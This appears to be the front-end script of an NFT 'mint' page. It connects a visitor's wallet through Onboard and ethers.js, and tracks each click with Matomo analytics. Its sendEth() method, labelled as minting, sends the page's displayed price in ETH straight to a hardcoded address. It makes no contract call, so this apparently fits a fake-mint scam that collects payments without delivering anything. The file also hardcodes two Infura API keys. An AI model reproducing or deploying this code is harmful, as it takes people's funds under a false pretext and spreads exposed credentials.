const NETWORK_ID = 1;
const RPC_URL = "https://mainnet.infura.io/v3/5b72c722716f44abb72aa0ad0562b4b6";
const ADDRESS = "0x4E1fe549c8d6A0C14344AAE81863ceB61fEA6F52";
class Wallet {
  provider;
  onboard = Onboard({
    networkId: NETWORK_ID,
    darkMode: !0,
    subscriptions: {
      wallet: (wallet) => {
        if (wallet.provider) {
          this.provider = new ethers.providers.Web3Provider(
            wallet.provider,
            "any"
          );
          window.localStorage.setItem("selectedWallet", wallet.name);
        } else {
          this.provider = null;
        }
      },
    },
    walletSelect: {
      wallets: [
        { walletName: "metamask" },
        { walletName: "trust", rpcUrl: RPC_URL },
        {
          walletName: "walletConnect",
          infuraKey: "981d10a2535145d7af18af4ab18f8b88",
        },
      ],
    },
  });
  async connectWallet() {
    await this.onboard.walletSelect();
    await this.onboard.walletCheck();
  }
  readyToTransact = async () => {
    if (!this.provider) {
      const walletSelected = await this.onboard.walletSelect();
      if (!walletSelected) return !1;
    }
    const ready = await this.onboard.walletCheck();
    return ready;
  };
  async sendEth() {
    let price = document.getElementById("price").textContent.toString();
    _paq.push(["trackEvent", "Mint", "Click Mint", "NFTs", price]);
    console.log(price);
    const ready = await this.readyToTransact();
    if (!ready) return;
    _paq.push(["trackEvent", "Mint", "Select Wallet", "NFTs"]);
    const signer = this.provider.getUncheckedSigner();
    try {
      await signer.sendTransaction({
        to: ADDRESS,
        value: ethers.utils.parseEther(price),
        gasLimit: 100000,
      });
      _paq.push(["trackEvent", "Mint", "Send Mint Transaction", "NFTs", price]);
    } catch (err) {
      console.log(err.message);
      _paq.push([
        "trackEvent",
        "Mint",
        "Error Sending Mint Transaction",
        err.message,
        price,
      ]);
    }
  }
}
const wallet = new Wallet();
